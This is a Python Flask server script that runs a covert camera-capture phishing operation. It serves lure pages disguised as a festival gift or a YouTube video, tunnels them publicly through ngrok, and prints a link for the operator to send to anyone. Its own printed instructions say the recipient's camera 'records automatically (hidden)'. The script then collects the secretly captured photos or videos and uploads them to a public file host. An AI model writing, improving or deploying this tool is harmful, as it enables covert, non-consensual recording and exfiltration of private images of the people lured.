#!/usr/bin/env python3
"""
Gift Video Receiver Server - With FileGoat Cloud Upload
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
import re
import requests
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

# ============================================
# Configuration
# ============================================
UPLOAD_FOLDER = 'gift_videos'
PORT = 5000
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

# FileGoat configuration
FILEGOAT_EXPIRY_DAYS = 7  # Default: 7 days
FILEGOAT_API_URL = "https://filego.at/upload"

# ============================================
# Flask Application
# ============================================
app = Flask(__name__)
CORS(app)

received_files = []
uploaded_links = []

def upload_to_filegoat(filepath, expiry_days=7):
    """
    Upload a file to FileGoat.
    
    Args:
        filepath: Path to the file to upload
        expiry_days: Days until file expires (1, 7, 30, 90)
    
    Returns:
        dict: {'success': bool, 'url': shareable_url, 'expiry': str, 'delete_url': str}
    """
    try:
        filename = os.path.basename(filepath)
        file_size = os.path.getsize(filepath)
        print(f"   ☁️ Uploading {filename} ({file_size:,} bytes) to FileGoat...")
        
        # FileGoat API expects expiry in seconds
        expiry_seconds = expiry_days * 24 * 60 * 60
        
        with open(filepath, 'rb') as f:
            files = {'file': (filename, f)}
            data = {'expiry': expiry_seconds}
            
            response = requests.post(
                FILEGOAT_API_URL,
                files=files,
                data=data,
                timeout=120  # 2 minute timeout for large files
            )
        
        if response.status_code == 200:
            result = response.json()
            
            # FileGoat returns a JSON with 'url' field
            if result.get('url'):
                return {
                    'success': True,
                    'url': result.get('url'),
                    'expiry': f"{expiry_days} days",
                    'delete_url': result.get('delete_url'),  # May not always be provided
                    'filename': filename,
                    'size': file_size
                }
            else:
                print(f"   ⚠️ No URL in response: {result}")
                return {'success': False, 'error': 'No URL in response'}
        else:
            print(f"   ❌ Upload failed with status {response.status_code}")
            print(f"   📋 Response: {response.text[:200]}")
            return {'success': False, 'error': f'HTTP {response.status_code}'}
            
    except requests.exceptions.Timeout:
        print(f"   ❌ Upload timeout - file may be too large")
        return {'success': False, 'error': 'Timeout'}
    except requests.exceptions.ConnectionError:
        print(f"   ❌ Connection error - check internet")
        return {'success': False, 'error': 'Connection error'}
    except Exception as e:
        print(f"   ❌ Upload error: {e}")
        return {'success': False, 'error': str(e)}

@app.route('/festival')
def festival_page():
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@app.route('/youtube')
def youtube_page():
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@app.route('/upload', methods=['POST'])
def upload_media():
    try:
        if 'media' not in request.files:
            return jsonify({'error': 'No media file'}), 400
        
        media_file = request.files['media']
        if media_file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        media_type = request.form.get('type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if media_type == 'photo':
            ext = 'jpg'
        else:
            ext = 'webm'
        
        filename = f"{media_type}_{timestamp}.{ext}"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        # Save file locally first
        media_file.save(filepath)
        
        file_info = {
            'filename': filename,
            'path': filepath,
            'type': media_type,
            'timestamp': timestamp,
            'size': os.path.getsize(filepath),
            'cloud_url': None,
            'expires': None,
            'delete_url': None
        }
        
        # ============================================
        # Upload to FileGoat
        # ============================================
        try:
            result = upload_to_filegoat(filepath, FILEGOAT_EXPIRY_DAYS)
            
            if result and result.get('success'):
                file_info['cloud_url'] = result.get('url')
                file_info['expires'] = result.get('expiry')
                file_info['delete_url'] = result.get('delete_url')
                
                print(f"   ✅ Uploaded to FileGoat!")
                print(f"   🔗 Link: {result.get('url')}")
                if result.get('delete_url'):
                    print(f"   🗑️ Delete URL: {result.get('delete_url')}")
                print(f"   ⏰ Expires in: {result.get('expiry')}")
                
                uploaded_links.append({
                    'filename': filename,
                    'url': result.get('url'),
                    'delete_url': result.get('delete_url'),
                    'expires': result.get('expiry')
                })
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'No result'
                print(f"   ⚠️ FileGoat upload failed: {error_msg}")
                
        except Exception as e:
            print(f"   ❌ FileGoat upload error: {e}")
        
        received_files.append(file_info)
        
        # Display received info
        print(f"\n📹 Received {media_type} {len(received_files)}")
        print(f"   📁 {filename}")
        print(f"   📊 {file_info['size']:,} bytes")
        print(f"   📂 Full path: {os.path.abspath(filepath)}")
        
        if file_info.get('cloud_url'):
            print(f"   ☁️ Cloud link: {file_info['cloud_url']}")
            print(f"   ⏰ Expires: {file_info['expires']}")
        else:
            print(f"   ⚠️ Not uploaded to cloud")
        
        return jsonify({
            'success': True, 
            'filename': filename,
            'cloud_url': file_info.get('cloud_url'),
            'delete_url': file_info.get('delete_url'),
            'local_path': os.path.abspath(filepath)
        }), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/files', methods=['GET'])
def list_files():
    return jsonify({
        'files': received_files,
        'cloud_links': uploaded_links
    })

@app.route('/cloud-links', methods=['GET'])
def get_cloud_links():
    """Get all cloud links"""
    return jsonify({
        'links': uploaded_links,
        'total': len(uploaded_links)
    })

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# Main Server Class
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def setup_directories(self):
        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)

    def check_html_files(self):
        if not os.path.exists(FESTIVAL_HTML):
            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
            return False
        if not os.path.exists(YOUTUBE_HTML):
            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
            return False
        return True

    def get_camera_type(self):
        print("\n📷 Select camera type:")
        print("  1. Front Camera")
        print("  2. Back Camera")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'user'
            elif choice == '2':
                return 'environment'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_capture_mode(self):
        print("\n📸 Select capture mode:")
        print("  1. Video - Record 15 second video")
        print("  2. Photo - Capture 5 photos")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'video', 15, 0
            elif choice == '2':
                return 'photo', 0, 5
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def show_main_menu(self):
        print("\n" + "="*60)
        print("🎁 GIFT VIDEO RECEIVER")
        print("="*60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        print("\n" + "-"*60)
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'festival'
            elif choice == '2':
                return 'youtube'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        name = input("\n📝 Enter festival/gift name: ").strip()
        if not name:
            name = "Surprise"
            print(f"   Using default: {name}")
        return name

    def get_youtube_video(self):
        print("\n🎬 Enter YouTube video URL or ID:")
        print("   (Press Enter for default video)")
        video = input("   ▶ ").strip()
        
        if video and ('youtube.com' in video or 'youtu.be' in video):
            patterns = [
                r'(?:youtube\.com\/watch\?v=)([^&]+)',
                r'(?:youtu\.be\/)([^?]+)',
                r'(?:youtube\.com\/embed\/)([^?]+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, video)
                if match:
                    video = match.group(1)
                    break
        
        if not video:
            video = "dQw4w9WgXcQ"
            print(f"   Using default video ID: {video}")
        else:
            print(f"   Using video ID: {video}")
        
        return video

    def get_cloud_config(self):
        """Get cloud upload configuration from user for FileGoat"""
        print("\n☁️ Cloud Upload Configuration (FileGoat):")
        print("   Files will be uploaded with auto-expiry")
        print("")
        print("   Select expiry time:")
        print("     1. 1 day")
        print("     2. 7 days (default)")
        print("     3. 30 days")
        print("     4. 90 days")
        
        while True:
            choice = input("\n   Enter choice (1-4, press Enter for default): ").strip()
            if choice == '' or choice == '2':
                return 7
            elif choice == '1':
                return 1
            elif choice == '3':
                return 30
            elif choice == '4':
                return 90
            else:
                print("   ❌ Invalid choice. Enter 1-4 or press Enter for default")

    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
        base_url = self.ngrok_url
        
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎬 YouTube Mode"
        
        return link, mode_name

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def wait_for_files(self):
        print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
        print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
        print("☁️ Files will be uploaded to FileGoat cloud")
        print("-"*50)
        print("\n⏳ Waiting for first file...")
        print("💡 Files will NOT auto-open. Check the folder or cloud links.")
        
        try:
            last_count = 0
            while self.running:
                current_count = len(received_files)
                
                if current_count > last_count:
                    file_info = received_files[-1]
                    print(f"\n📹 Received {file_info['type']} {current_count}")
                    print(f"   📁 {file_info['filename']}")
                    print(f"   📊 {file_info['size']:,} bytes")
                    print(f"   📂 Full path: {os.path.abspath(file_info['path'])}")
                    
                    if file_info.get('cloud_url'):
                        print(f"   ☁️ FileGoat link: {file_info['cloud_url']}")
                        print(f"   ⏰ Expires: {file_info['expires']}")
                        if file_info.get('delete_url'):
                            print(f"   🗑️ Delete URL: {file_info['delete_url']}")
                    else:
                        print(f"   ⚠️ Not uploaded to cloud")
                    
                    print("\n   💡 To download from cloud, use the link above")
                    print(f"   📁 Or open locally: cd {os.path.abspath(UPLOAD_FOLDER)}")
                    last_count = current_count
                    print(f"\n⏳ Waiting for next file...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            self.setup_directories()
            
            if not self.check_html_files():
                return
            
            if not self.check_ngrok():
                return
            
            # Get cloud config
            global FILEGOAT_EXPIRY_DAYS
            FILEGOAT_EXPIRY_DAYS = self.get_cloud_config()
            print(f"   ✅ Files will expire after: {FILEGOAT_EXPIRY_DAYS} days")
            
            mode = self.show_main_menu()
            
            camera = self.get_camera_type()
            
            capture_mode, duration, photos = self.get_capture_mode()
            
            if mode == 'festival':
                name = self.get_festival_name()
                video_id = None
            else:
                video_id = self.get_youtube_video()
                name = None
            
            self.start_flask()
            if not self.start_ngrok():
                return
            
            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
            
            print("\n" + "="*60)
            print(f"📤 SHARE THIS LINK ({mode_name}):")
            print("="*60)
            print(f"\n🔗 {link}")
            print("\n" + "="*60)
            
            print("\n📋 Configuration Summary:")
            print(f"   🎯 Mode: {mode_name}")
            print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
            print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
            print(f"   ☁️ Cloud expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
            
            if mode == 'festival':
                print(f"   🎊 Festival Name: {name}")
            else:
                print(f"   🎬 Video ID: {video_id}")
            
            print("\n📋 Instructions:")
            if mode == 'festival':
                print("   1. Send the link above to anyone")
                print("   2. They see a festival/gift page")
                print("   3. They click 'Open Your Gift'")
                print("   4. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   5. Records {duration} second video")
                else:
                    print(f"   5. Captures {photos} photos")
                print("   6. Files upload to FileGoat cloud!")
            else:
                print("   1. Send the link above to anyone")
                print("   2. They see a YouTube video playing")
                print("   3. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   4. Records {duration} second video")
                else:
                    print(f"   4. Captures {photos} photos")
                print("   5. Files upload to FileGoat cloud!")
            
            print(f"\n☁️ FileGoat: Files expire after {FILEGOAT_EXPIRY_DAYS} days")
            print("   Links will be shown when files are received")
            
            print("\n💡 Files saved locally too. Check the folder:")
            print(f"   📁 cd {os.path.abspath(UPLOAD_FOLDER)}")
            print("="*60)
            print("\n📋 Link printed above - copy it manually")
            print(f"📁 Files saved in: {os.path.abspath(UPLOAD_FOLDER)}/")
            
            self.wait_for_files()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    server = GiftServer()
    server.run()